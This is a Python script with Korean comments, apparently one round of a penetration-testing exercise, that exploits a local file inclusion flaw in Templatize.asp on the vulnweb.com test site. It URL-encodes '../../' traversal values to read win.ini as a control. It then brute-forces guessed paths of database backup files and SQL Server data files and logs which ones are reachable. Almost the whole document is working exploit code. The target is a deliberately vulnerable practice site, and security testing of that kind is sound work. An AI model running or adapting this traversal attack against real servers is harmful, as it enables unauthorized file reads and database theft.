#!/usr/bin/env python3
"""Round 10c — C 단계 3차 실행 (이중 인코딩 버그 수정).
이전 실패 원인: item 에 '%2f' 를 미리 넣고 quote(safe='') 를 다시 걸어 '%252f' 로 이중 인코딩됨.
수정: 실제 문자 '../..' 로 만든 뒤 **한 번만** quote 한다. 대조군(C:\\Windows\\win.ini → 200)이
반드시 통과해야 결과를 신뢰한다 — 대조군 실패 시 '차단'으로 단정하지 않는다.
"""
import json, urllib.parse, urllib.request, urllib.error

TMPL = "http://testasp.vulnweb.com/Templatize.asp"
REQ = {"n": 0}


def _get(url):
    REQ["n"] += 1
    try:
        with urllib.request.urlopen(url, timeout=30) as r:
            return r.status, r.read().decode("latin-1", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("latin-1", "replace")
    except Exception as e:
        return 0, f"EXC:{e}"


def lfi_probe(abs_path, label):
    q = abs_path.strip().replace("\\", "/")
    if len(q) > 1 and q[1] == ":":
        q = q[3:]
    item = "../../" + q.lstrip("/")                 # 실제 문자로 만든 뒤
    url = TMPL + "?item=" + urllib.parse.quote(item, safe="")   # 한 번만 인코딩
    code, body = _get(url)
    ok = code == 200 and len(body) > 1300
    print(f"  [{'★도달' if ok else '   -  '}] {label}\n        {url.split('item=')[1]}\n        → {code} size={len(body)}")
    return {"label": label, "path": abs_path, "item": item, "code": code,
            "size": len(body), "reachable": ok}


R = {"lfi": []}
print("### 0. 대조군 먼저 (이게 실패하면 아래 결과는 전부 '미상'으로 취급)")
ctl = lfi_probe("C:\\Windows\\win.ini", "대조군 win.ini (Round 7 에서 200 확인됨)")
R["control"] = ctl
if not ctl["reachable"]:
    print("  !! 대조군 실패 — 경로/인코딩이 여전히 잘못됐을 수 있음. 결과를 신뢰하지 말 것")

DIR = "C:\\Backup_testasp_testaspnet_1apr2021\\Databases\\Backup_from_Management_Studio"
print("\n### 1. 백업 파일 (physical_device_name 원문 + 확장자 변형)")
R["lfi"].append(lfi_probe(DIR + "\\acublog_1apr2021", "원문 그대로(확장자 없음)"))
for ext in [".bak", ".trn", ".zip", ".7z", ".rar", ".sql", ".txt"]:
    R["lfi"].append(lfi_probe(DIR + "\\acublog_1apr2021" + ext, f"확장자 추정 {ext}"))
print("\n### 2. 다른 DB 백업 파일명 추정 (같은 패턴/디렉터리)")
for db in ["acuforum", "acuservice", "acuforum_1apr2021", "acuservice_1apr2021"]:
    for ext in ["", ".bak"]:
        nm = db if db.endswith("2021") else f"{db}_1apr2021"
        R["lfi"].append(lfi_probe(DIR + "\\" + nm + ext, f"{nm}{ext}"))
print("\n### 3. 백업 디렉터리 상위/자체")
R["lfi"].append(lfi_probe("C:\\Backup_testasp_testaspnet_1apr2021\\Databases", "상위 Databases 디렉터리"))
R["lfi"].append(lfi_probe(DIR, "백업 디렉터리 자체"))
print("\n### 4. SQL DATA 디렉터리의 DB 파일 (내용은 읽지 않음 — 실존만)")
for f in ["acuforum.mdf", "acuforum_log.LDF", "acublog.mdf", "acuservice.mdf"]:
    R["lfi"].append(lfi_probe(
        "C:\\Program Files\\Microsoft SQL Server\\MSSQL12.SQL\\MSSQL\\DATA\\" + f, f"DATA\\{f}"))
print("\n### 5. 백업 디렉터리 경로 자체가 존재하는지 (파일명 없이 디렉터리 접근은 500 예상)")
R["lfi"].append(lfi_probe("C:\\Backup_testasp_testaspnet_1apr2021", "최상위 Backup_... 디렉터리"))

hit = [x for x in R["lfi"] if x["reachable"]]
R["reachable_count"] = len(hit)
R["requests"] = REQ["n"]
with open("out/backup_paths3.json", "w", encoding="utf-8") as f:
    json.dump(R, f, ensure_ascii=False, indent=2)
print(f"\n### 완료 — 도달 {len(hit)}/{len(R['lfi'])}건, 총 요청 {REQ['n']}건 → out/backup_paths3.json")
